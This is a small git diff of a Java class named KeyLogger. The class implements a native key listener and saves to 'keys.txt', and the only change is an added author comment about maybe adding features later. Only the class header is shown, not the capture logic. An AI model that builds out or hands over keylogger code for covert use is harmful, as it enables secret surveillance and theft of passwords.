@@ -19,6 +19,8 @@ import org.slf4j.LoggerFactory;
 /**
  * @author vakho
  */
+
+//in the future maybe i will add for this keylogger new feature i am just trying out github rightnow
 public class KeyLogger implements NativeKeyListener {
 
 	private static final Path file = Paths.get("keys.txt");
